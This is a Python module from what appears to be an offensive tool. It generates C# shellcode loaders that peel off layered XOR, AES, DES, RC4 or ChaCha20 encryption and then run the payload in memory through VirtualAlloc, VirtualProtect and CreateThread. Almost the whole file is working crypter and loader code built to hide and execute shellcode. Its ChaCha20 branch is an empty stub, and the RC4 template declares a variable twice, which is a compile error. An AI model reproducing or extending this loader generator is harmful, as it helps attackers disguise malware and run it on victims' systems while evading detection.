#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C# 解密加载器模块：单一职责 - 生成C#解密加载器代码（适配加密历史，自动解密）
"""
from core.encrypt.encrypt_manager import EncryptionHistory

class CSharpDecryptLoader:
    """C# 解密加载器（适配加密历史，自动解密 Shellcode 后运行）"""
    @staticmethod
    def generate_decrypt(shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成 C# 解密加载器代码"""
        # 获取加密历史
        encrypt_history = encryption_history.get_full_history()
        
        # 生成解密逻辑
        decrypt_logic = ""
        decrypt_calls = ""
        
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]
            
            if alg == "XOR":
                key_hex = params["key_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                key_str = ", ".join(key_bytes)
                
                decrypt_logic += f"""
        // 第 {idx} 轮解密：XOR 解密
        private static void XorDecrypt{idx}(byte[] shellcode)
        {{
            byte[] key = new byte[] {{ {key_str} }};
            for (int i = 0; i < shellcode.Length; i++)
            {{
                shellcode[i] ^= key[i % key.Length];
            }}
        }}
"""
                
                decrypt_calls += f"            XorDecrypt{idx}(shellcode);\n"
            
            elif alg == "AES-256-CBC":
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                iv_bytes = [f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)]
                key_str = ", ".join(key_bytes)
                iv_str = ", ".join(iv_bytes)
                
                decrypt_logic += f"""
        // 第 {idx} 轮解密：AES-256-CBC 解密
        private static byte[] AesDecrypt{idx}(byte[] shellcode)
        {{
            try
            {{
                byte[] key = new byte[] {{ {key_str} }};
                byte[] iv = new byte[] {{ {iv_str} }};
                
                using (System.Security.Cryptography.Aes aes = System.Security.Cryptography.Aes.Create())
                {{
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                    aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    
                    using (System.Security.Cryptography.ICryptoTransform decryptor = aes.CreateDecryptor())
                    {{
                        byte[] decrypted = decryptor.TransformFinalBlock(shellcode, 0, shellcode.Length);
                        return decrypted;
                    }}
                }}
            }}
            catch (Exception ex)
            {{
                Console.WriteLine($"AES-256-CBC解密失败: {{ex.Message}}");
                return shellcode;
            }}
        }}
"""

                decrypt_calls += f"            shellcode = AesDecrypt{idx}(shellcode);\n"
            
            elif alg == "DES-CBC":
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                iv_bytes = [f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)]
                key_str = ", ".join(key_bytes)
                iv_str = ", ".join(iv_bytes)
                
                decrypt_logic += f"""
        // 第 {idx} 轮解密：DES-CBC 解密
        private static byte[] DesDecrypt{idx}(byte[] shellcode)
        {{
            try
            {{
                byte[] key = new byte[] {{ {key_str} }};
                byte[] iv = new byte[] {{ {iv_str} }};
                
                using (System.Security.Cryptography.DES des = System.Security.Cryptography.DES.Create())
                {{
                    des.Key = key;
                    des.IV = iv;
                    des.Mode = System.Security.Cryptography.CipherMode.CBC;
                    des.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    
                    using (System.Security.Cryptography.ICryptoTransform decryptor = des.CreateDecryptor())
                    {{
                        byte[] decrypted = decryptor.TransformFinalBlock(shellcode, 0, shellcode.Length);
                        return decrypted;
                    }}
                }}
            }}
            catch (Exception ex)
            {{
                Console.WriteLine($"DES-CBC解密失败: {{ex.Message}}");
                return shellcode;
            }}
        }}
"""

                decrypt_calls += f"            shellcode = DesDecrypt{idx}(shellcode);\n"
            
            elif alg == "RC4":
                key_hex = params["key_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                key_str = ", ".join(key_bytes)
                
                decrypt_logic += f"""
        // 第 {idx} 轮解密：RC4 解密
        private static void Rc4Decrypt{idx}(byte[] shellcode)
        {{
            byte[] key = new byte[] {{ {key_str} }};
            
            // 初始化S盒
            byte[] sBox = new byte[256];
            for (int i = 0; i < 256; i++)
            {{
                sBox[i] = (byte)i;
            }}
            
            int j = 0;
            for (int i = 0; i < 256; i++)
            {{
                j = (j + sBox[i] + key[i % key.Length]) % 256;
                byte temp = sBox[i];
                sBox[i] = sBox[j];
                sBox[j] = temp;
            }}
            
            // 解密过程
            int i = 0;
            j = 0;
            for (int k = 0; k < shellcode.Length; k++)
            {{
                i = (i + 1) % 256;
                j = (j + sBox[i]) % 256;
                byte temp = sBox[i];
                sBox[i] = sBox[j];
                sBox[j] = temp;
                byte t = (byte)((sBox[i] + sBox[j]) % 256);
                byte kValue = sBox[t];
                shellcode[k] ^= kValue;
            }}
        }}
"""
                
                decrypt_calls += f"            Rc4Decrypt{idx}(shellcode);\n"
            
            elif alg == "ChaCha20":
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_bytes = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                nonce_bytes = [f"0x{nonce_hex[i:i+2]}" for i in range(0, len(nonce_hex), 2)]
                key_str = ", ".join(key_bytes)
                nonce_str = ", ".join(nonce_bytes)
                
                decrypt_logic += f"""
        // 第 {idx} 轮解密：ChaCha20 解密
        private static void ChaCha20Decrypt{idx}(byte[] shellcode)
        {{
            byte[] key = new byte[] {{ {key_str} }};
            byte[] nonce = new byte[] {{ {nonce_str} }};
            
            // 注意：ChaCha20 解密需要使用第三方库或自行实现
            // 这里提供一个简化的实现，实际使用中可能需要调整
            Console.WriteLine("ChaCha20 decryption not implemented in this template. Please add ChaCha20 decryption logic.");
        }}
"""
                
                decrypt_calls += f"            ChaCha20Decrypt{idx}(shellcode);\n"
        
        # 生成完整的加载器代码
        loader_template = f"""
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;

namespace DecryptShellcodeLoader
{{
    class Program
    {{
        // 导入 Windows API（用于内存分配与执行）
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // 常量定义（内存分配与保护属性）
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint INFINITE = 0xFFFFFFFF;

        {decrypt_logic}

        static void Main(string[] args)
        {{
            // 请将格式化后的加密 Shellcode 填入此处
            byte[] shellcode = new byte[{shellcode_len}];

            // 执行解密
            {decrypt_calls}

            // 1. 分配可读写内存
            IntPtr allocAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (allocAddr == IntPtr.Zero)
            {{
                Console.WriteLine("内存分配失败");
                return;
            }}

            // 2. 将解密后的 Shellcode 写入分配的内存
            Marshal.Copy(shellcode, 0, allocAddr, shellcode.Length);

            // 3. 修改内存属性为可执行
            uint oldProtect;
            bool protectResult = VirtualProtect(allocAddr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
            if (!protectResult)
            {{
                Console.WriteLine("内存属性修改失败");
                return;
            }}

            // 4. 创建并执行线程（运行 Shellcode）
            uint threadId;
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, out threadId);
            if (threadHandle == IntPtr.Zero)
            {{
                Console.WriteLine("线程创建失败");
                return;
            }}

            // 5. 等待线程执行完成
            WaitForSingleObject(threadHandle, INFINITE);
        }}
    }}
}}
"""
        
        return loader_template.strip()
